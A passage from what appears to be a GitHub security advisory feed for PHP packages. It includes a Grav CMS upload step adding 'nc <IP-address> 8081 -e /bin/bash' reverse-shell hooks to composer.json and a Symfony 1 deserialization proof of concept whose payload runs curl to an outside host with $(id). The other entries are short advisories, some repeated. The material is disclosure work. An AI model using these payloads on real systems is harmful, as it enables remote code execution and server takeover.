Note: "nc" or netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. We are using this tool to get a reverse shell from the server hosting Grav CMS.
7. Using a web interception proxy, click on the "Page Media" section and upload a json file with the following added to the "scripts" section (<a href="https://getcomposer.org/doc/articles/scripts.md">https://getcomposer.org/doc/articles/scripts.md</a>):</p>
<pre><code>"post-install-cmd": "nc &lt;IP-address&gt; 8081 -e /bin/bash",
"post-update-cmd": "nc &lt;IP-address&gt; 8081 -e /bin/bash"
</code></pre>
<p><strong><em>Note:</em></strong> The post installation and update script used in this PoC is only for demonstration purposes. There are various other scripts that may be injected such as <code>command</code> that executes the corresponding script before any Composer Command is executed on the CLI.
<img alt="image" src="https://user-images.githubusercontent.com/48800246/296317602-89fe155d-34a7-4b35-a6b4-d1964057ce65.png">
<em>Note: . Please replace  with the IP address of the Kali Linux netcat listener.</em>
8. Modify the "name" parameter to "../../../c/omposer.json" and forward the request.
9. Observe the successful upload message from the server response:
<img alt="image" src="https://user-images.githubusercontent.com/48800246/296320057-fcc0d456-c282-42eb-bcf0-1155d4b5d24a.png">
10. In the Grav web root, observe that the "composer.json" file was successfully replaced by the malicious "composer.json" file containing a reverse shell script.
11. Run any variations of the following commands in the Grav web server and observe the successful reverse shell:</p>
<ul>
<li>bin/grav composer</li>
<li>composer update</li>
<li>composer install
<img alt="image" src="https://user-images.githubusercontent.com/48800246/296322101-5654dee4-44ba-4806-9dc7-25d8e0240486.png"></li>
</ul>
<h3 id="impact">Impact</h3>
<ol>
<li><p><strong>Arbitrary Code Injection:</strong> Attackers can replace a malicious composer.json file, executed during "composer" package updates/installations or "bin/gpm composer" commands. This can allow unauthorized code execution on the server, with the added severity of reverse shell access, granting attackers control over the web server.</p>
</li>
<li><p><strong>Backup Compromise:</strong> .zip backup files can be replaced, potentially undermining data integrity and recovery mechanisms:
<img alt="image" src="https://github.com/getgrav/grav/assets/48800246/94ab1546-a576-43a7-ac6e-f72acee74fb8">
<img alt="image" src="https://github.com/getgrav/grav/assets/48800246/7f29b597-ca17-4e17-a949-c8658e567caa"></p>
</li>
<li><p><strong>Sensitive Information Exposure:</strong> Modification of .css files provides an avenue for attackers to exfiltrate sensitive information, such as usernames and passwords, compromising user confidentiality.
<img alt="image" src="https://github.com/getgrav/grav/assets/48800246/ed492d7b-0776-4a56-8b8f-fde7b8c9ea99"></p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-m7hx-hw6h-mqmc">https://github.com/getgrav/grav/security/advisories/GHSA-m7hx-hw6h-mqmc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27921">https://nvd.nist.gov/vuln/detail/CVE-2024-27921</a></li>
<li><a href="https://github.com/getgrav/grav/commit/5928411b86bab05afca2b33db4e7386a44858e99">https://github.com/getgrav/grav/commit/5928411b86bab05afca2b33db4e7386a44858e99</a></li>
<li><a href="https://github.com/advisories/GHSA-m7hx-hw6h-mqmc">https://github.com/advisories/GHSA-m7hx-hw6h-mqmc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7hx-hw6h-mqmc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-22T16:29:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ibexa/core] Ibexa Kernel's files with blacklisted extensions can be still saved to drafts]]></title>
        <id>https://github.com/advisories/GHSA-9j39-4686-m3c4</id>
        <link href="https://github.com/advisories/GHSA-9j39-4686-m3c4"/>
        <updated>2024-03-20T18:56:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>File validation can be configured to reject certain files by file type. When this happens, validation fails, and the content can't be published. However, the file can be saved when saving the content draft. This means unwanted files can be present in storage, even if they are not easily accessible due to the content not being published. The fix ensures these unwanted file types are never stored. An attacker would need to have existing access to create content with a file field type to exploit this.</p>
<h3 id="patches">Patches</h3>
<p>See "Patched versions".
Commit: <a href="https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1">https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></p>
<h3 id="references">References</h3>
<p><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ibexa/core/security/advisories/GHSA-9j39-4686-m3c4">https://github.com/ibexa/core/security/advisories/GHSA-9j39-4686-m3c4</a></li>
<li><a href="https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1">https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></li>
<li><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></li>
<li><a href="https://github.com/advisories/GHSA-9j39-4686-m3c4">https://github.com/advisories/GHSA-9j39-4686-m3c4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9j39-4686-m3c4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T18:14:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ibexa/core] Ibexa Kernel's files with blacklisted extensions can be still saved to drafts]]></title>
        <id>https://github.com/advisories/GHSA-9j39-4686-m3c4</id>
        <link href="https://github.com/advisories/GHSA-9j39-4686-m3c4"/>
        <updated>2024-03-20T18:56:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>File validation can be configured to reject certain files by file type. When this happens, validation fails, and the content can't be published. However, the file can be saved when saving the content draft. This means unwanted files can be present in storage, even if they are not easily accessible due to the content not being published. The fix ensures these unwanted file types are never stored. An attacker would need to have existing access to create content with a file field type to exploit this.</p>
<h3 id="patches">Patches</h3>
<p>See "Patched versions".
Commit: <a href="https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1">https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></p>
<h3 id="references">References</h3>
<p><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ibexa/core/security/advisories/GHSA-9j39-4686-m3c4">https://github.com/ibexa/core/security/advisories/GHSA-9j39-4686-m3c4</a></li>
<li><a href="https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1">https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></li>
<li><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></li>
<li><a href="https://github.com/advisories/GHSA-9j39-4686-m3c4">https://github.com/advisories/GHSA-9j39-4686-m3c4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9j39-4686-m3c4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T18:14:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ezsystems/ezplatform-kernel] Ibexa Kernel's files with blacklisted extensions can be still saved to drafts]]></title>
        <id>https://github.com/advisories/GHSA-mwvh-p3hx-x4gg</id>
        <link href="https://github.com/advisories/GHSA-mwvh-p3hx-x4gg"/>
        <updated>2024-03-20T18:55:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>File validation can be configured to reject certain files by file type. When this happens, validation fails, and the content can't be published. However, the file can be saved when saving the content draft. This means unwanted files can be present in storage, even if they are not easily accessible due to the content not being published. The fix ensures these unwanted file types are never stored. An attacker would need to have existing access to create content with a file field type to exploit this.</p>
<h3 id="patches">Patches</h3>
<p>See "Patched versions".
Commit: <a href="https://github.com/ezsystems/ezplatform-kernel/commit/7e472317f7c75f45f72f74c38406952d8bea0de1">https://github.com/ezsystems/ezplatform-kernel/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></p>
<h3 id="references">References</h3>
<p><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ezsystems/ezplatform-kernel/security/advisories/GHSA-mwvh-p3hx-x4gg">https://github.com/ezsystems/ezplatform-kernel/security/advisories/GHSA-mwvh-p3hx-x4gg</a></li>
<li><a href="https://github.com/ezsystems/ezplatform-kernel/commit/7e472317f7c75f45f72f74c38406952d8bea0de1">https://github.com/ezsystems/ezplatform-kernel/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></li>
<li><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></li>
<li><a href="https://github.com/advisories/GHSA-mwvh-p3hx-x4gg">https://github.com/advisories/GHSA-mwvh-p3hx-x4gg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mwvh-p3hx-x4gg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T18:13:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[livewire/livewire] Cross-site Scripting in livewire/livewire]]></title>
        <id>https://github.com/advisories/GHSA-389c-cf87-qmwj</id>
        <link href="https://github.com/advisories/GHSA-389c-cf87-qmwj"/>
        <updated>2024-03-20T15:25:07.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package livewire/livewire from 3.3.5 and before 3.4.9 are vulnerable to Cross-site Scripting (XSS) when a page uses [Url] for a property. An attacker can inject HTML code in the context of the user's browser session by crafting a malicious link and convincing the user to click on it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21504">https://nvd.nist.gov/vuln/detail/CVE-2024-21504</a></li>
<li><a href="https://github.com/livewire/livewire/pull/8117">https://github.com/livewire/livewire/pull/8117</a></li>
<li><a href="https://github.com/livewire/livewire/commit/c65b3f0798ab2c9338213ede3588c3cdf4e6fcc0">https://github.com/livewire/livewire/commit/c65b3f0798ab2c9338213ede3588c3cdf4e6fcc0</a></li>
<li><a href="https://github.com/livewire/livewire/releases/tag/v3.4.9">https://github.com/livewire/livewire/releases/tag/v3.4.9</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PHP-LIVEWIRELIVEWIRE-6446222">https://security.snyk.io/vuln/SNYK-PHP-LIVEWIRELIVEWIRE-6446222</a></li>
<li><a href="https://github.com/advisories/GHSA-389c-cf87-qmwj">https://github.com/advisories/GHSA-389c-cf87-qmwj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-389c-cf87-qmwj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-19T06:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ilicmiljan/secure-props] [TagAwareCipher] - Decryption Failure (Regex Match)]]></title>
        <id>https://github.com/advisories/GHSA-rj29-j2g4-77q8</id>
        <link href="https://github.com/advisories/GHSA-rj29-j2g4-77q8"/>
        <updated>2024-03-19T18:30:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Vulnerability in <strong>SecureProps</strong> involves a regex failing to detect tags during decryption of encrypted data. </p>
<p>This occurs when the encrypted data has been encoded with <code>NullEncoder</code> and passed to <code>TagAwareCipher</code>, and contains special characters such as <code>\n</code>. As a result, the decryption process is skipped since the tags are not detected. This causes the encrypted data to be returned in plain format. </p>
<p>The vulnerability affects users who implement <code>TagAwareCipher</code> with any base cipher that has <code>NullEncoder</code> (not default).</p>
<h3 id="patches">Patches</h3>
<p>The patch for the issue has been released. Users are advised to update to version <strong>1.2.2</strong>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><strong>The main recommendation is to update to the latest version as there are no breaking changes.</strong></p>
<p>If that's not possible, you can use the default <code>Base64Encoder</code> with the base cipher decorated with <code>TagAwareCipher</code> to prevent special characters in the encrypted string from interfering with regex tag detection logic. </p>
<p>This workaround is safe but may involve double encoding since <code>TagAwareCipher</code> uses <code>Base64Encoder</code> by default.</p>
<h3 id="references">References</h3>
<p>Reported issue: <a href="https://github.com/IlicMiljan/Secure-Props/issues/20">https://github.com/IlicMiljan/Secure-Props/issues/20</a>
Pull request resolving bug: <a href="https://github.com/IlicMiljan/Secure-Props/pull/21">https://github.com/IlicMiljan/Secure-Props/pull/21</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/IlicMiljan/Secure-Props/security/advisories/GHSA-rj29-j2g4-77q8">https://github.com/IlicMiljan/Secure-Props/security/advisories/GHSA-rj29-j2g4-77q8</a></li>
<li><a href="https://github.com/IlicMiljan/Secure-Props/issues/20">https://github.com/IlicMiljan/Secure-Props/issues/20</a></li>
<li><a href="https://github.com/IlicMiljan/Secure-Props/pull/21">https://github.com/IlicMiljan/Secure-Props/pull/21</a></li>
<li><a href="https://github.com/IlicMiljan/Secure-Props/commit/ab7b561040cd37fda3dbf9a6cab01fefcaa16627">https://github.com/IlicMiljan/Secure-Props/commit/ab7b561040cd37fda3dbf9a6cab01fefcaa16627</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28864">https://nvd.nist.gov/vuln/detail/CVE-2024-28864</a></li>
<li><a href="https://github.com/advisories/GHSA-rj29-j2g4-77q8">https://github.com/advisories/GHSA-rj29-j2g4-77q8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rj29-j2g4-77q8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-18T20:39:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[friendsofsymfony1/symfony1] Gadget chain in Symfony 1 due to vulnerable Swift Mailer dependency]]></title>
        <id>https://github.com/advisories/GHSA-wjv8-pxr6-5f4r</id>
        <link href="https://github.com/advisories/GHSA-wjv8-pxr6-5f4r"/>
        <updated>2024-03-18T20:36:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Symfony 1 has a gadget chain due to vulnerable Swift Mailer dependency that would enable an attacker to get remote code execution if a developer unserialize user input in his project.</p>
<h3 id="details">Details</h3>
<p>This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:</p>
<pre><code class="language-php"> public function executeIndex(sfWebRequest $request)
  {
    $a = unserialize($request-&gt;getParameter('user'));
  }
</code></pre>
<p>We will make the assumption this is the case in the rest of this explanation.</p>
<p>Symfony 1 depends on Swift Mailer which is bundled by default in <code>vendor</code> directory in the default installation since 1.3.0. Swift Mailer classes implement some <code>__destruct()</code> methods like for instance <code>Swift_KeyCache_DiskKeyCache</code> :</p>
<pre><code class="language-php">  public function __destruct()
  {
    foreach ($this-&gt;_keys as $nsKey=&gt;$null)
    {
      $this-&gt;clearAll($nsKey);
    }
  }
</code></pre>
<p>This method is called when php destroy the object in memory. However, it is possible to include any object type in <code>$this-&gt;_keys</code> to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on <code>foreach($this-&gt;_keys ...)</code> for any class implementing <code>ArrayAccess</code>  interface. <code>sfOutputEscaperArrayDecorator</code>  implements such interface. Here is the call made on <code>offsetGet()</code>:</p>
<pre><code class="language-php">  public function offsetGet($offset)
  {
    return sfOutputEscaper::escape($this-&gt;escapingMethod, $this-&gt;value[$offset]);
  }
</code></pre>
<p>Which trigger <code>escape()</code> in <code>sfOutputEscaper</code> class with attacker controlled parameters from deserialized object with <code>$this-&gt;escapingMethod</code> and <code>$this-&gt;value[$offset]</code>:</p>
<pre><code class="language-php">  public static function escape($escapingMethod, $value)
  {
    if (null === $value)
    {
      return $value;
    }

    // Scalars are anything other than arrays, objects and resources.
    if (is_scalar($value))
    {
      return call_user_func($escapingMethod, $value);
    }
</code></pre>
<p>Which calls <code>call_user_func</code> with previous attacker controlled input.</p>
<p>However, most recent versions of Swift Mailer are not vulnerable anymore. A fix has been done with <a href="https://github.com/swiftmailer/swiftmailer/commit/5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed">commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</a> to prevent #arbitrary deserialization. This commit has been shipped with version 6.2.5 of Swift Mailer.</p>
<p>Concreetly, <code>__wakeup()</code> have been implemented to clear attributes' values:</p>
<pre><code class="language-php">  public function __wakeup()
  {
      $this-&gt;keys = [];
  }
</code></pre>
<p>And/or prevent any deserialization:</p>
<pre><code class="language-php">  public function __wakeup()
  {
      throw new \BadMethodCallException('Cannot unserialize '.__CLASS__);
  }
</code></pre>
<p>If you install last version 1.5 with composer, you will end-up installing last 6.x version of Swift Mailer containing the previous fixes. Here is an extract of the composer.lock:</p>
<pre><code class="language-json">{
  "name": "friendsofsymfony1/symfony1",
  "version": "v1.5.15",
  "source": {
      "type": "git",
      "url": "https://github.com/FriendsOfSymfony1/symfony1.git",
      "reference": "9945f3f27cdc5aac36f5e8c60485e5c9d5df86f2"
  },
  "require": {
      "php": "&gt;=5.3.0",
      "swiftmailer/swiftmailer": "~5.2 || ^6.0"
  },
  ...
  {
    "name": "swiftmailer/swiftmailer",
    "version": "v6.3.0",
  ...
  }
}
</code></pre>
<p>By reviewing releases archives, <code>composer.json</code> targets vulnerable branch 5.x before Symfony 1.5.13 included:</p>
<pre><code class="language-json">{
    "name": "friendsofsymfony1/symfony1",
    "description": "Fork of symfony 1.4 with dic, form enhancements, latest swiftmailer and better performance",
    "type": "library",
    "license": "MIT",
    "require": {
        "php" : "&gt;=5.3.0",
        "swiftmailer/swiftmailer": "~5.2"
    },
    ...
</code></pre>
<p>So, the gadget chain is valid for at least versions until 1.5.13.</p>
<p>However, if you install last version of Symfony with git as described in the README, Swift Mailer vendors is referenced through a git sub-module targeting branch 5.x of Swift Mailer:</p>
<pre><code class="language-shell">[submodule "lib/vendor/swiftmailer"]
    path = lib/vendor/swiftmailer
    url = https://github.com/swiftmailer/swiftmailer.git
    branch = 5.x
[submodule "lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine"]
    path = lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine
    url = https://github.com/FriendsOfSymfony1/doctrine1.git
</code></pre>
<p>And branch 5.x does not have the backport of the fix commited on branch 6.x. Last commit date from Jul 31, 2018.</p>
<h3 id="poc">PoC</h3>
<p>So we need the following object to trigger an OS command like <code>shell_exec("curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)");</code>:</p>
<pre><code class="language-php">object(Swift_KeyCache_DiskKeyCache)#88 (4) {
  ["_stream":"Swift_KeyCache_DiskKeyCache":private]=&gt;
  NULL
  ["_path":"Swift_KeyCache_DiskKeyCache":private]=&gt;
  string(25) "thispathshouldneverexists"
  ["_keys":"Swift_KeyCache_DiskKeyCache":private]=&gt;
  object(sfOutputEscaperArrayDecorator)#89 (3) {
    ["count":"sfOutputEscaperArrayDecorator":private]=&gt;
    NULL
    ["value":protected]=&gt;
    array(1) {
      [1]=&gt;
      string(66) "curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)"
    }
    ["escapingMethod":protected]=&gt;
    string(10) "shell_exec"
  }
  ["_quotes":"Swift_KeyCache_DiskKeyCache":private]=&gt;
  bool(false)
}
</code></pre>
<p>We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:</p>
<ul>
<li>gadgets.php:</li>
</ul>
<pre><code class="language-php">class Swift_KeyCache_DiskKeyCache
{
  private $_path;
  private $_keys = array();
  public function __construct($keys, $path) {
    $this-&gt;_keys = $keys;
    $this-&gt;_path = $path;
  }
}

class sfOutputEscaperArrayDecorator
{
  protected $value;
  protected $escapingMethod;
  public function __construct($escapingMethod, $value) {
    $this-&gt;escapingMethod = $escapingMethod;
    $this-&gt;value = $value;
  }
}
</code></pre>
<ul>
<li>chain.php:</li>
</ul>
<pre><code class="language-php">namespace GadgetChain\Symfony;

class RCE12 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.3.0 &lt; 1.5.15';
    public static $vector = '__destruct';
    public static $author = 'darkpills';
    public static $information = 
        'Based on Symfony 1 and Swift mailer in Symfony\'s vendor';

    public function generate(array $parameters)
    {
        $cacheKey = "1";
        $keys = new \sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey =&gt; $parameters['parameter']));
        $path = "thispathshouldneverexists";
        $cache = new \Swift_KeyCache_DiskKeyCache($keys, $path);

        return $cache;
    }
}
</code></pre>
<p>And trigger the deserialization with an HTTP request like the following on a dummy test controller:</p>
<pre><code class="language-http">POST /frontend_dev.php/test/index HTTP/1.1
Host: localhost:8001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 532

user=a%3A2%3A%7Bi%3A7%3BO%3A27%3A%22Swift_KeyCache_DiskKeyCache%22%3A2%3A%7Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_path%22%3Bs%3A25%3A%22thispathshouldneverexists%22%3Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_keys%22%3BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A66%3A%22curl+https%3A%2F%2Fh0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D
</code></pre>
<p>Note that CVSS score is not applicable to this kind of vulnerability.</p>
<h3 id="impact">Impact</h3>
<p>The attacker can execute any PHP command which leads to remote code execution.</p>
<h3 id="recommendation">Recommendation</h3>
<p>As with composer, Symfony is already using branch 6.x of Swift mailer there does not seem to be breaking change for Symfony 1 with branch 6.x? Or is it a mistake?</p>
<p>In this case, update submodule reference to version 6.2.5 or higher, after commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>
<p>Or if Symfony 1.5 need Swift 5.x, fork Swift mailer in a FOS/SwiftMailer repository and cherry-pick commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r">https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28859">https://nvd.nist.gov/vuln/detail/CVE-2024-28859</a></li>
<li><a href="https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166">https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166</a></li>
<li><a href="https://github.com/advisories/GHSA-wjv8-pxr6-5f4r">https://github.com/advisories/GHSA-wjv8-pxr6-5f4r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wjv8-pxr6-5f4r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:36:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bagisto/bagisto] Bagisto vulnerable to Insecure Direct Object Reference (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-pmc7-hmmw-g96q</id>
        <link href="https://github.com/advisories/GHSA-pmc7-hmmw-g96q"/>
        <updated>2024-03-15T21:03:01.000Z</updated>
        <content type="html"><![CDATA[<p>Insecure Direct Object Reference (IDOR) in Bagisto v.1.5.0 allows an attacker to obtain sensitive information via the invoice ID parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36238">https://nvd.nist.gov/vuln/detail/CVE-2023-36238</a></li>
<li><a href="https://github.com/Ek-Saini/security/blob/main/IDOR-Bagisto">https://github.com/Ek-Saini/security/blob/main/IDOR-Bagisto</a></li>
<li><a href="https://github.com/bagisto/bagisto/pull/4697">https://github.com/bagisto/bagisto/pull/4697</a></li>
<li><a href="https://github.com/bagisto/bagisto/commit/2a24098cb582e072c87177e0ad17be45f240ad17">https://github.com/bagisto/bagisto/commit/2a24098cb582e072c87177e0ad17be45f240ad17</a></li>
<li><a href="https://github.com/advisories/GHSA-pmc7-hmmw-g96q">https://github.com/advisories/GHSA-pmc7-hmmw-g96q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmc7-hmmw-g96q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-13T21:31:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[remdex/livehelperchat] livehelperchat Server-Side Template Injection]]></title>
        <id>https://github.com/advisories/GHSA-v4cp-2q7v-hg9q</id>
        <link href="https://github.com/advisories/GHSA-v4cp-2q7v-hg9q"/>
        <updated>2024-03-22T15:46:22.000Z</updated>
        <content type="html"><![CDATA[<p>Server-Side Template Injection (SSTI) vulnerability in livehelperchat before 4.34, allows remote attackers to execute arbitrary code and obtain sensitive information via the search parameter in lhc_web/modules/lhfaq/faqweight.php.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27516">https://nvd.nist.gov/vuln/detail/CVE-2024-27516</a></li>
<li><a href="https://github.com/LiveHelperChat/livehelperchat/issues/2054">https://github.com/LiveHelperChat/livehelperchat/issues/2054</a></li>
<li><a href="https://github.com/LiveHelperChat/livehelperchat/commit/a61d231526a36d4a7d8cc957914799ee1f9db0ab">https://github.com/LiveHelperChat/livehelperchat/commit/a61d231526a36d4a7d8cc957914799ee1f9db0ab</a></li>
<li><a href="https://github.com/advisories/GHSA-v4cp-2q7v-hg9q">https://github.com/advisories/GHSA-v4cp-2q7v-hg9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v4cp-2q7v-hg9q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-29T03:33:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[concrete5/concrete5] Concrete CMS Stored XSS in Layout Preset Name]]></title>
        <id>https://github.com/advisories/GHSA-x577-gcc9-9xjj</id>
        <link href="https://github.com/advisories/GHSA-x577-gcc9-9xjj"/>
        <updated>2024-03-10T05:00:59.000Z</updated>
        <content type="html"><![CDATA[<p>Concrete CMS before 8.5.14 and 9 before 9.2.3 is vulnerable to an admin adding a stored XSS payload via the Layout Preset name.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48650">https://nvd.nist.gov/vuln/detail/CVE-2023-48650</a></li>
<li><a href="https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes">https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes</a></li>
<li><a href="https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates">https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0">https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b">https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b</a></li>
<li><a href="https://github.com/advisories/GHSA-x577-gcc9-9xjj">https://github.com/advisories/GHSA-x577-gcc9-9xjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x577-gcc9-9xjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-29T03:33:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[concrete5/concrete5] Concrete CMS Stored XSS in Layout Preset Name]]></title>
        <id>https://github.com/advisories/GHSA-x577-gcc9-9xjj</id>
        <link href="https://github.com/advisories/GHSA-x577-gcc9-9xjj"/>
        <updated>2024-03-10T05:00:59.000Z</updated>
        <content type="html"><![CDATA[<p>Concrete CMS before 8.5.14 and 9 before 9.2.3 is vulnerable to an admin adding a stored XSS payload via the Layout Preset name.</p>
<h3 id="references">References</h3>
<ul>
